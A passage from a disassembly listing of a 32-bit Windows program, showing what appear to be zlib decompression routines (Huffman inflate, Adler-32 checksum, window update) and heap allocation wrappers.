		mov	edi, [esp+8Ch+arg_C]
		mov	al, dl
		sub	al, bl
		xor	ecx, ecx
		mov	byte ptr [esp+8Ch+var_7C], 40h
		mov	byte ptr [esp+8Ch+var_7C+1], al
		mov	word ptr [esp+8Ch+var_7C+2], cx
		test	ebp, ebp
		jz	short loc_402538
		mov	esi, [esp+8Ch+var_6C]

loc_4024E6:				; CODE XREF: sub_402090+4A6j
		test	ebx, ebx
		jz	short loc_402508
		mov	eax, [esp+8Ch+var_4C]
		and	eax, ebp
		cmp	eax, [esp+8Ch+var_54]
		jz	short loc_402508
		mov	eax, [esp+8Ch+var_78]
		mov	esi, [edi]
		xor	ebx, ebx
		mov	[esp+8Ch+var_74], eax
		mov	byte ptr [esp+8Ch+var_7C+1], al
		mov	edx, eax

loc_402508:				; CODE XREF: sub_402090+458j
					; sub_402090+464j
		mov	ecx, ebx
		mov	eax, ebp
		shr	eax, cl
		mov	ecx, [esp+8Ch+var_7C]
		mov	[esi+eax*4], ecx
		lea	ecx, [edx-1]
		mov	eax, 1
		shl	eax, cl
		test	ebp, eax
		jz	short loc_402529

loc_402523:				; CODE XREF: sub_402090+497j
		shr	eax, 1
		test	ebp, eax
		jnz	short loc_402523

loc_402529:				; CODE XREF: sub_402090+491j
		test	eax, eax
		jz	short loc_402538
		lea	ecx, [eax-1]
		and	ecx, ebp
		add	ecx, eax
		mov	ebp, ecx
		jnz	short loc_4024E6

loc_402538:				; CODE XREF: sub_402090+450j
					; sub_402090+49Bj
		mov	edx, [esp+8Ch+var_64]
		mov	ecx, [esp+8Ch+arg_10]
		lea	eax, ds:0[edx*4]
		add	[edi], eax
		mov	edx, [esp+8Ch+var_78]
		pop	edi
		pop	esi
		pop	ebp
		mov	[ecx], edx
		xor	eax, eax
		pop	ebx
		add	esp, 7Ch
		retn
; ---------------------------------------------------------------------------

loc_40255C:				; CODE XREF: sub_402090+271j
					; sub_402090+3FCj
		pop	edi
		pop	esi
		pop	ebp
		mov	eax, 1
		pop	ebx
		add	esp, 7Ch
		retn
sub_402090	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402570	proc near		; CODE XREF: sub_402E20+338p
		push	esi
		mov	esi, edx
		test	esi, esi
		jz	short loc_40258B
		sub	ecx, eax
		lea	esp, [esp+0]

loc_402580:				; CODE XREF: sub_402570+19j
		mov	dl, [ecx+eax]
		mov	[eax], dl
		inc	eax
		sub	esi, 1
		jnz	short loc_402580

loc_40258B:				; CODE XREF: sub_402570+5j
		pop	esi
		retn
sub_402570	endp

; ---------------------------------------------------------------------------
		align 10h

loc_402590:				; DATA XREF: sub_403D10+29o
		mov	eax, [esp+8]
		push	eax
		push	0
		call	ds:GetProcessHeap
		push	eax
		call	ds:HeapFree
		retn
; ---------------------------------------------------------------------------
		align 10h

loc_4025B0:				; DATA XREF: sub_403D10+15o
		mov	eax, [esp+8]
		imul	eax, [esp+0Ch]
		push	eax
		push	0
		call	ds:GetProcessHeap
		push	eax
		call	ds:HeapAlloc
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_4025D0	proc near		; CODE XREF: sub_402E20+7EAp

var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		sub	esp, 3Ch
		push	ebx
		push	ebp
		push	esi
		push	edi
		mov	ecx, [esp+4Ch+arg_0]
		mov	eax, [ecx+1Ch]
		mov	edx, [ecx+4]
		mov	ebx, [eax+38h]
		mov	ebp, [ecx]
		dec	ebp
		lea	edx, [edx+ebp-5]
		mov	[esp+4Ch+var_38], edx
		mov	esi, [ecx+0Ch]
		mov	ecx, [ecx+10h]
		mov	edx, ecx
		sub	edx, [esp+4Ch+arg_4]
		dec	esi
		add	edx, esi
		lea	ecx, [ecx+esi-101h]
		mov	[esp+4Ch+var_14], edx
		mov	edx, [eax+28h]
		mov	[esp+4Ch+var_20], ecx
		mov	ecx, [eax+2Ch]
		mov	[esp+4Ch+var_24], edx
		mov	edx, [eax+30h]
		mov	[esp+4Ch+var_10], ecx
		mov	ecx, [eax+34h]
		mov	[esp+4Ch+var_8], edx
		mov	edx, [eax+4Ch]
		mov	[esp+4Ch+var_C], ecx
		mov	ecx, [eax+50h]
		mov	[esp+4Ch+var_2C], edx
		mov	[esp+4Ch+var_28], ecx
		mov	ecx, [eax+54h]
		mov	edx, 1
		shl	edx, cl
		mov	ecx, [eax+58h]
		mov	[esp+4Ch+var_34], eax
		mov	edi, [eax+3Ch]
		mov	[esp+4Ch+arg_4], 1
		mov	eax, [esp+4Ch+arg_4]
		shl	eax, cl
		dec	edx
		mov	[esp+4Ch+var_3C], ebp
		mov	[esp+4Ch+var_4], edx
		dec	eax
		mov	[esp+4Ch+var_1C], eax

loc_402667:				; CODE XREF: sub_4025D0+369j
		cmp	edi, 0Fh
		jnb	short loc_40268C
		movzx	eax, byte ptr [ebp+1]
		inc	ebp
		mov	ecx, edi
		shl	eax, cl
		inc	ebp
		add	edi, 8
		mov	ecx, edi
		add	ebx, eax
		movzx	eax, byte ptr [ebp+0]
		shl	eax, cl
		mov	[esp+4Ch+var_3C], ebp
		add	ebx, eax
		add	edi, 8

loc_40268C:				; CODE XREF: sub_4025D0+9Aj
		mov	ecx, [esp+4Ch+var_2C]
		and	edx, ebx
		mov	eax, [ecx+edx*4]
		mov	edx, eax
		shr	edx, 8
		movzx	ecx, dl
		movzx	edx, al
		shr	ebx, cl
		sub	edi, ecx
		test	edx, edx
		jz	short loc_4026E9

loc_4026A8:				; CODE XREF: sub_4025D0+117j
		test	dl, 10h
		jnz	short loc_4026F4
		test	dl, 40h
		jnz	loc_4029AA
		mov	ecx, 1
		mov	[esp+4Ch+arg_4], ecx
		mov	ecx, edx
		mov	edx, [esp+4Ch+arg_4]
		shl	edx, cl
		shr	eax, 10h
		dec	edx
		and	edx, ebx
		add	edx, eax
		mov	eax, [esp+4Ch+var_2C]
		mov	eax, [eax+edx*4]
		mov	ecx, eax
		shr	ecx, 8
		movzx	ecx, cl
		movzx	edx, al
		shr	ebx, cl
		sub	edi, ecx
		test	edx, edx
		jnz	short loc_4026A8

loc_4026E9:				; CODE XREF: sub_4025D0+D6j
		inc	esi
		shr	eax, 10h
		mov	[esi], al
		jmp	loc_40291F
; ---------------------------------------------------------------------------

loc_4026F4:				; CODE XREF: sub_4025D0+DBj
		shr	eax, 10h
		and	edx, 0Fh
		mov	[esp+4Ch+arg_4], eax
		jz	short loc_40272A
		cmp	edi, edx
		jnb	short loc_402716
		movzx	eax, byte ptr [ebp+1]
		inc	ebp
		mov	ecx, edi
		shl	eax, cl
		mov	[esp+4Ch+var_3C], ebp
		add	ebx, eax
		add	edi, 8

loc_402716:				; CODE XREF: sub_4025D0+132j
		mov	ecx, edx
		mov	eax, 1
		shl	eax, cl
		dec	eax
		and	eax, ebx
		add	[esp+4Ch+arg_4], eax
		shr	ebx, cl
		sub	edi, edx

loc_40272A:				; CODE XREF: sub_4025D0+12Ej
		cmp	edi, 0Fh
		jnb	short loc_40274F
		movzx	edx, byte ptr [ebp+1]
		inc	ebp
		movzx	eax, byte ptr [ebp+1]
		mov	ecx, edi
		inc	ebp
		shl	edx, cl
		add	edi, 8
		mov	ecx, edi
		shl	eax, cl
		add	ebx, edx
		mov	[esp+4Ch+var_3C], ebp
		add	ebx, eax
		add	edi, 8

loc_40274F:				; CODE XREF: sub_4025D0+15Dj
		mov	ecx, [esp+4Ch+var_1C]
		mov	edx, [esp+4Ch+var_28]
		and	ecx, ebx
		mov	edx, [edx+ecx*4]
		mov	eax, edx
		shr	eax, 8
		movzx	ecx, al
		movzx	eax, dl
		shr	ebx, cl
		sub	edi, ecx
		mov	[esp+4Ch+var_30], edx
		test	al, 10h
		jnz	short loc_4027AC

loc_402773:				; CODE XREF: sub_4025D0+1DAj
		test	al, 40h
		jnz	loc_40299D
		mov	ecx, eax
		movzx	eax, word ptr [esp+4Ch+var_30+2]
		mov	edx, 1
		shl	edx, cl
		mov	ecx, [esp+4Ch+var_28]
		dec	edx
		and	edx, ebx
		add	edx, eax
		mov	edx, [ecx+edx*4]
		mov	eax, edx
		shr	eax, 8
		movzx	ecx, al
		movzx	eax, dl
		shr	ebx, cl
		sub	edi, ecx
		mov	[esp+4Ch+var_30], edx
		test	al, 10h
		jz	short loc_402773

loc_4027AC:				; CODE XREF: sub_4025D0+1A1j
		shr	edx, 10h
		and	eax, 0Fh
		mov	[esp+4Ch+var_30], edx
		cmp	edi, eax
		jnb	short loc_4027E2
		movzx	edx, byte ptr [ebp+1]
		inc	ebp
		mov	ecx, edi
		shl	edx, cl
		add	edi, 8
		mov	[esp+4Ch+var_3C], ebp
		add	ebx, edx
		cmp	edi, eax
		jnb	short loc_4027E2
		movzx	edx, byte ptr [ebp+1]
		inc	ebp
		mov	ecx, edi
		shl	edx, cl
		mov	[esp+4Ch+var_3C], ebp
		add	ebx, edx
		add	edi, 8

loc_4027E2:				; CODE XREF: sub_4025D0+1E8j
					; sub_4025D0+1FEj
		mov	ecx, 1
		mov	edx, ecx
		mov	ecx, eax
		shl	edx, cl
		sub	edi, eax
		dec	edx
		and	edx, ebx
		mov	ecx, edx
		mov	edx, [esp+4Ch+var_30]
		add	edx, ecx
		mov	ecx, eax
		mov	eax, esi
		sub	eax, [esp+4Ch+var_14]
		shr	ebx, cl
		mov	[esp+4Ch+var_30], edx
		cmp	edx, eax
		jbe	loc_40293E
		mov	ebp, edx
		sub	ebp, eax
		cmp	ebp, [esp+4Ch+var_10]
		ja	loc_402982
		mov	ecx, [esp+4Ch+var_C]
		mov	eax, [esp+4Ch+var_8]
		dec	ecx
		mov	[esp+4Ch+var_18], ecx
		test	eax, eax
		jnz	short loc_402853
		mov	eax, [esp+4Ch+var_24]
		sub	eax, ebp
		add	ecx, eax
		cmp	ebp, [esp+4Ch+arg_4]
		jnb	loc_4028C2
		sub	[esp+4Ch+arg_4], ebp

loc_402845:				; CODE XREF: sub_4025D0+27Fj
		mov	al, [ecx+1]
		inc	ecx
		inc	esi
		sub	ebp, 1
		mov	[esi], al
		jnz	short loc_402845
		jmp	short loc_4028BE
; ---------------------------------------------------------------------------

loc_402853:				; CODE XREF: sub_4025D0+25Dj
		cmp	eax, ebp
		jnb	short loc_4028A4
		mov	edx, eax
		sub	edx, ebp
		add	edx, [esp+4Ch+var_24]
		sub	ebp, eax
		add	ecx, edx
		cmp	ebp, [esp+4Ch+arg_4]
		jnb	short loc_4028C2
		sub	[esp+4Ch+arg_4], ebp
		lea	ecx, [ecx+0]

loc_402870:				; CODE XREF: sub_4025D0+2AAj
		mov	dl, [ecx+1]
		inc	ecx
		inc	esi
		sub	ebp, 1
		mov	[esi], dl
		jnz	short loc_402870
		mov	ecx, [esp+4Ch+var_18]
		cmp	eax, [esp+4Ch+arg_4]
		jnb	short loc_4028C2
		sub	[esp+4Ch+arg_4], eax
		mov	ebp, eax
		lea	esp, [esp+0]

loc_402890:				; CODE XREF: sub_4025D0+2CAj
		mov	al, [ecx+1]
		inc	ecx
		inc	esi
		sub	ebp, 1
		mov	[esi], al
		jnz	short loc_402890
		mov	ecx, esi
		sub	ecx, [esp+4Ch+var_30]
		jmp	short loc_4028C2
; ---------------------------------------------------------------------------

loc_4028A4:				; CODE XREF: sub_4025D0+285j
		sub	eax, ebp
		add	ecx, eax
		cmp	ebp, [esp+4Ch+arg_4]
		jnb	short loc_4028C2
		sub	[esp+4Ch+arg_4], ebp

loc_4028B2:				; CODE XREF: sub_4025D0+2ECj
		mov	al, [ecx+1]
		inc	ecx
		inc	esi
		sub	ebp, 1
		mov	[esi], al
		jnz	short loc_4028B2

loc_4028BE:				; CODE XREF: sub_4025D0+281j
		mov	ecx, esi
		sub	ecx, edx

loc_4028C2:				; CODE XREF: sub_4025D0+26Bj
					; sub_4025D0+297j ...
		mov	eax, [esp+4Ch+arg_4]
		cmp	eax, 2
		jbe	short loc_402901
		lea	edx, [eax-3]
		mov	eax, 0AAAAAAABh
		mul	edx
		mov	ebp, edx
		shr	ebp, 1
		inc	ebp
		lea	ebx, [ebx+0]

loc_4028E0:				; CODE XREF: sub_4025D0+32Fj
		movzx	eax, byte ptr [ecx+1]
		sub	[esp+4Ch+arg_4], 3
		inc	ecx
		inc	esi
		mov	[esi], al
		mov	dl, [ecx+1]
		inc	ecx
		inc	esi
		mov	[esi], dl
		movzx	eax, byte ptr [ecx+1]
		inc	ecx
		inc	esi
		sub	ebp, 1
		mov	[esi], al
		jnz	short loc_4028E0

loc_402901:				; CODE XREF: sub_4025D0+2F9j
		mov	ebp, [esp+4Ch+arg_4]
		test	ebp, ebp
		jz	short loc_40291B
		mov	dl, [ecx+1]
		inc	ecx
		inc	esi
		mov	[esi], dl
		cmp	ebp, 1
		jbe	short loc_40291B
		mov	al, [ecx+1]
		inc	esi
		mov	[esi], al

loc_40291B:				; CODE XREF: sub_4025D0+337j
					; sub_4025D0+343j
		mov	ebp, [esp+4Ch+var_3C]

loc_40291F:				; CODE XREF: sub_4025D0+11Fj
					; sub_4025D0+39Cj ...
		mov	edx, [esp+4Ch+var_38]
		cmp	ebp, edx
		jnb	loc_4029D4
		cmp	esi, [esp+4Ch+var_20]
		jnb	loc_4029D4
		mov	edx, [esp+4Ch+var_4]
		jmp	loc_402667
; ---------------------------------------------------------------------------

loc_40293E:				; CODE XREF: sub_4025D0+23Aj
		mov	eax, esi
		sub	eax, edx

loc_402942:				; CODE XREF: sub_4025D0+398j
		movzx	ecx, byte ptr [eax+1]
		inc	eax
		mov	[esi+1], cl
		mov	dl, [eax+1]
		inc	esi
		inc	eax
		inc	esi
		mov	[esi], dl
		movzx	ecx, byte ptr [eax+1]
		inc	eax
		inc	esi
		mov	[esi], cl
		mov	ecx, [esp+4Ch+arg_4]
		sub	ecx, 3
		mov	[esp+4Ch+arg_4], ecx
		cmp	ecx, 2
		ja	short loc_402942
		test	ecx, ecx
		jz	short loc_40291F
		mov	dl, [eax+1]
		inc	eax
		inc	esi
		mov	[esi], dl
		cmp	ecx, 1
		jbe	short loc_40291F
		mov	al, [eax+1]
		inc	esi
		mov	[esi], al
		jmp	short loc_40291F
; ---------------------------------------------------------------------------

loc_402982:				; CODE XREF: sub_4025D0+248j
		mov	ecx, [esp+4Ch+arg_0]
		mov	edx, [esp+4Ch+var_34]
		mov	ebp, [esp+4Ch+var_3C]
		mov	dword ptr [ecx+18h], offset aInvalidDista_0 ; "invalid distance	too far	back"
		mov	dword ptr [edx], 1Bh
		jmp	short loc_4029D0
; ---------------------------------------------------------------------------

loc_40299D:				; CODE XREF: sub_4025D0+1A5j
		mov	eax, [esp+4Ch+arg_0]
		mov	dword ptr [eax+18h], offset aInvalidDista_1 ; "invalid distance	code"
		jmp	short loc_4029C6
; ---------------------------------------------------------------------------

loc_4029AA:				; CODE XREF: sub_4025D0+E0j
		test	dl, 20h
		jz	short loc_4029BB
		mov	edx, [esp+4Ch+var_34]
		mov	dword ptr [edx], 0Bh
		jmp	short loc_4029D0
; ---------------------------------------------------------------------------

loc_4029BB:				; CODE XREF: sub_4025D0+3DDj
		mov	eax, [esp+4Ch+arg_0]
		mov	dword ptr [eax+18h], offset aInvalidLiter_0 ; "invalid literal/length code"

loc_4029C6:				; CODE XREF: sub_4025D0+3D8j
		mov	ecx, [esp+4Ch+var_34]
		mov	dword ptr [ecx], 1Bh

loc_4029D0:				; CODE XREF: sub_4025D0+3CBj
					; sub_4025D0+3E9j
		mov	edx, [esp+4Ch+var_38]

loc_4029D4:				; CODE XREF: sub_4025D0+355j
					; sub_4025D0+35Fj
		mov	eax, edi
		shr	eax, 3
		sub	ebp, eax
		add	eax, eax
		add	eax, eax
		add	eax, eax
		sub	edi, eax
		mov	ecx, edi
		mov	eax, 1
		shl	eax, cl
		mov	ecx, [esp+4Ch+arg_0]
		sub	edx, ebp
		add	edx, 5
		dec	eax
		and	ebx, eax
		lea	eax, [ebp+1]
		mov	[ecx], eax
		lea	eax, [esi+1]
		mov	[ecx+0Ch], eax
		mov	eax, [esp+4Ch+var_20]
		sub	eax, esi
		add	eax, 101h
		mov	[ecx+10h], eax
		mov	eax, [esp+4Ch+var_34]
		mov	[eax+3Ch], edi
		pop	edi
		pop	esi
		pop	ebp
		mov	[eax+38h], ebx
		mov	[ecx+4], edx
		pop	ebx
		add	esp, 3Ch
		retn
sub_4025D0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402A30	proc near		; CODE XREF: sub_402E20+142p
					; sub_402E20+1D8p ...
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		mov	ebx, eax
		shr	edi, 10h
		and	ecx, 0FFFFh
		mov	esi, edx
		cmp	ebx, 1
		jnz	short loc_402A79
		movzx	eax, byte ptr [esi]
		add	ecx, eax
		cmp	ecx, 0FFF1h
		jb	short loc_402A5A
		sub	ecx, 0FFF1h

loc_402A5A:				; CODE XREF: sub_402A30+22j
		add	edi, ecx
		cmp	edi, 0FFF1h
		jb	loc_402C83
		sub	edi, 0FFF1h
		mov	eax, edi
		pop	edi
		shl	eax, 10h
		pop	esi
		or	eax, ecx
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_402A79:				; CODE XREF: sub_402A30+15j
		test	esi, esi
		jnz	short loc_402A84
		pop	edi
		lea	eax, [esi+1]
		pop	esi
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_402A84:				; CODE XREF: sub_402A30+4Bj
		cmp	ebx, 10h
		jnb	short loc_402AC7
		test	ebx, ebx
		jz	short loc_402A9D
		lea	ecx, [ecx+0]

loc_402A90:				; CODE XREF: sub_402A30+6Bj
		movzx	edx, byte ptr [esi]
		add	ecx, edx
		dec	ebx
		inc	esi
		add	edi, ecx
		test	ebx, ebx
		jnz	short loc_402A90

loc_402A9D:				; CODE XREF: sub_402A30+5Bj
		cmp	ecx, 0FFF1h
		jb	short loc_402AAB
		sub	ecx, 0FFF1h

loc_402AAB:				; CODE XREF: sub_402A30+73j
		mov	eax, 80078071h
		mul	edi
		shr	edx, 0Fh
		mov	eax, edx
		shl	eax, 4
		sub	eax, edx
		add	eax, edi
		pop	edi
		shl	eax, 10h
		pop	esi
		or	eax, ecx
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_402AC7:				; CODE XREF: sub_402A30+57j
		cmp	ebx, 15B0h
		jb	loc_402BA9
		mov	eax, 5E6EA9AFh
		mul	ebx
		push	ebp
		mov	ebp, edx
		shr	ebp, 0Bh

loc_402AE0:				; CODE XREF: sub_402A30+172j
		sub	ebx, 15B0h
		mov	eax, 15Bh
		jmp	short loc_402AF0
; ---------------------------------------------------------------------------
		align 10h

loc_402AF0:				; CODE XREF: sub_402A30+BBj
					; sub_402A30+145j
		movzx	edx, byte ptr [esi]
		add	ecx, edx
		movzx	edx, byte ptr [esi+1]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+2]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+3]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+4]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+5]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+6]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+7]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+8]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+9]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+0Ah]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+0Bh]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+0Ch]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+0Dh]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+0Eh]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+0Fh]
		add	edi, ecx
		add	ecx, edx
		add	edi, ecx
		add	esi, 10h
		sub	eax, 1
		jnz	loc_402AF0
		mov	eax, 80078071h
		mul	ecx
		shr	edx, 0Fh
		imul	edx, 0FFFF000Fh
		add	ecx, edx
		mov	eax, 80078071h
		mul	edi
		shr	edx, 0Fh
		imul	edx, 0FFFF000Fh
		add	edi, edx
		sub	ebp, 1
		jnz	loc_402AE0
		pop	ebp

loc_402BA9:				; CODE XREF: sub_402A30+9Dj
		test	ebx, ebx
		jz	loc_402C83
		cmp	ebx, 10h
		jb	loc_402C4E
		mov	eax, ebx
		shr	eax, 4
		nop

loc_402BC0:				; CODE XREF: sub_402A30+218j
		movzx	edx, byte ptr [esi]
		add	ecx, edx
		movzx	edx, byte ptr [esi+1]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+2]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+3]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+4]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+5]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+6]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+7]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+8]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+9]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+0Ah]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+0Bh]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+0Ch]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+0Dh]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+0Eh]
		add	edi, ecx
		add	ecx, edx
		movzx	edx, byte ptr [esi+0Fh]
		add	edi, ecx
		add	ecx, edx
		sub	ebx, 10h
		add	edi, ecx
		add	esi, 10h
		sub	eax, 1
		jnz	loc_402BC0

loc_402C4E:				; CODE XREF: sub_402A30+184j
		test	ebx, ebx
		jz	short loc_402C5F

loc_402C52:				; CODE XREF: sub_402A30+22Dj
		movzx	eax, byte ptr [esi]
		add	ecx, eax
		dec	ebx
		inc	esi
		add	edi, ecx
		test	ebx, ebx
		jnz	short loc_402C52

loc_402C5F:				; CODE XREF: sub_402A30+220j
		mov	eax, 80078071h
		mul	ecx
		shr	edx, 0Fh
		imul	edx, 0FFFF000Fh
		add	ecx, edx
		mov	eax, 80078071h
		mul	edi
		shr	edx, 0Fh
		imul	edx, 0FFFF000Fh
		add	edi, edx

loc_402C83:				; CODE XREF: sub_402A30+32j
					; sub_402A30+17Bj
		mov	eax, edi
		pop	edi
		shl	eax, 10h
		pop	esi
		or	eax, ecx
		pop	ebx
		retn
sub_402A30	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402C90	proc near		; CODE XREF: sub_402E20+DCCp

arg_0		= dword	ptr  4

		push	ebx
		push	ebp
		mov	ebp, [esp+8+arg_0]
		push	esi
		mov	esi, [ebp+1Ch]
		xor	ebx, ebx
		push	edi
		mov	edi, eax
		cmp	[esi+34h], ebx
		jnz	short loc_402CCC
		mov	ecx, [esi+24h]
		mov	edx, [ebp+20h]
		mov	eax, 1
		shl	eax, cl
		mov	ecx, [ebp+28h]
		push	1
		push	eax
		push	ecx
		call	edx
		add	esp, 0Ch
		mov	[esi+34h], eax
		cmp	eax, ebx
		jnz	short loc_402CCC
		pop	edi
		pop	esi
		pop	ebp
		lea	eax, [ebx+1]
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_402CCC:				; CODE XREF: sub_402C90+12j
					; sub_402C90+32j
		cmp	[esi+28h], ebx
		jnz	short loc_402CE4
		mov	ecx, [esi+24h]
		mov	eax, 1
		shl	eax, cl
		mov	[esi+30h], ebx
		mov	[esi+2Ch], ebx
		mov	[esi+28h], eax

loc_402CE4:				; CODE XREF: sub_402C90+3Fj
		sub	edi, [ebp+10h]
		mov	ecx, [esi+28h]
		cmp	edi, ecx
		jb	short loc_402D1B
		mov	eax, [ebp+0Ch]
		mov	edx, [esi+34h]
		mov	edi, ecx
		sub	eax, ecx
		cmp	edi, ebx
		jz	short loc_402D0B
		lea	esp, [esp+0]

loc_402D00:				; CODE XREF: sub_402C90+79j
		mov	cl, [eax]
		mov	[edx], cl
		inc	edx
		inc	eax
		sub	edi, 1
		jnz	short loc_402D00

loc_402D0B:				; CODE XREF: sub_402C90+6Aj
		mov	edx, [esi+28h]
		pop	edi
		mov	[esi+30h], ebx
		mov	[esi+2Ch], edx
		pop	esi
		pop	ebp
		xor	eax, eax
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_402D1B:				; CODE XREF: sub_402C90+5Cj
		sub	ecx, [esi+30h]
		mov	edx, ecx
		cmp	edx, edi
		jbe	short loc_402D26
		mov	edx, edi

loc_402D26:				; CODE XREF: sub_402C90+92j
		mov	ebp, [ebp+0Ch]
		mov	eax, [esi+34h]
		add	eax, [esi+30h]
		mov	ecx, ebp
		sub	ecx, edi
		mov	[esp+10h+arg_0], edx
		cmp	edx, ebx
		jz	short loc_402D4F
		jmp	short loc_402D40
; ---------------------------------------------------------------------------
		align 10h

loc_402D40:				; CODE XREF: sub_402C90+ABj
					; sub_402C90+BBj
		mov	bl, [ecx]
		mov	[eax], bl
		inc	eax
		inc	ecx
		sub	[esp+10h+arg_0], 1
		jnz	short loc_402D40
		xor	ebx, ebx

loc_402D4F:				; CODE XREF: sub_402C90+A9j
		sub	edi, edx
		jz	short loc_402D7C
		mov	eax, [esi+34h]
		mov	ecx, edi
		sub	ebp, edi
		lea	ebx, [ebx+0]

loc_402D60:				; CODE XREF: sub_402C90+DAj
		mov	dl, [ebp+0]
		mov	[eax], dl
		inc	eax
		inc	ebp
		sub	ecx, 1
		jnz	short loc_402D60
		mov	eax, [esi+28h]
		mov	[esi+30h], edi
		pop	edi
		mov	[esi+2Ch], eax
		pop	esi
		pop	ebp
		xor	eax, eax
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_402D7C:				; CODE XREF: sub_402C90+C1j
		add	[esi+30h], edx
		mov	ecx, [esi+30h]
		mov	eax, [esi+28h]
		cmp	ecx, eax
		jnz	short loc_402D8C
		mov	[esi+30h], ebx

loc_402D8C:				; CODE XREF: sub_402C90+F7j
		mov	ecx, [esi+2Ch]
		cmp	ecx, eax
		jnb	short loc_402D98
		add	ecx, edx
		mov	[esi+2Ch], ecx

loc_402D98:				; CODE XREF: sub_402C90+101j
		pop	edi
		pop	esi
		pop	ebp
		xor	eax, eax
		pop	ebx
		retn
sub_402C90	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402DA0	proc near		; CODE XREF: sub_402E20+25Fp
		mov	dword ptr [eax+4Ch], offset dword_4015A8
		mov	dword ptr [eax+54h], 9
		mov	dword ptr [eax+50h], offset dword_401DA8
		mov	dword ptr [eax+58h], 5
		retn
sub_402DA0	endp

; ---------------------------------------------------------------------------
		align 10h
; START	OF FUNCTION CHUNK FOR sub_403D10

loc_402DC0:				; CODE XREF: sub_403D10+67j
		xor	ecx, ecx
		cmp	edx, ecx
		jz	short loc_402E13
		mov	eax, [edx+1Ch]
		cmp	eax, ecx
		jz	short loc_402E13
		mov	[eax+1Ch], ecx
		mov	[eax], ecx
		mov	[eax+4], ecx
		mov	[eax+0Ch], ecx
		mov	[eax+20h], ecx
		mov	[eax+28h], ecx
		mov	[eax+2Ch], ecx
		mov	[eax+30h], ecx
		mov	[eax+38h], ecx
		mov	[eax+3Ch], ecx
		mov	[edx+14h], ecx
		mov	[edx+8], ecx
		mov	[edx+18h], ecx
		lea	ecx, [eax+530h]
		mov	dword ptr [eax+14h], 8000h
		mov	[eax+6Ch], ecx
		mov	[eax+50h], ecx
		mov	[eax+4Ch], ecx
		mov	dword ptr [edx+30h], 1
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_402E13:				; CODE XREF: sub_403D10-F4Cj
					; sub_403D10-F45j
		mov	eax, 0FFFFFFFEh
		retn
; END OF FUNCTION CHUNK	FOR sub_403D10
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402E20	proc near		; CODE XREF: start+4B3p

var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  4

		mov	edx, [esp+arg_0]
		sub	esp, 28h
		push	ebp
		push	edi
		test	edx, edx
		jz	loc_403C7D
		mov	edi, [edx+1Ch]
		test	edi, edi
		jz	loc_403C7D
		mov	eax, [edx+0Ch]
		test	eax, eax
		jz	loc_403C7D
		mov	ebp, [edx]
		test	ebp, ebp
		jnz	short loc_402E56
		cmp	[edx+4], ebp
		jnz	loc_403C7D

loc_402E56:				; CODE XREF: sub_402E20+2Bj
		cmp	dword ptr [edi], 0Bh
		jnz	short loc_402E61
		mov	dword ptr [edi], 0Ch

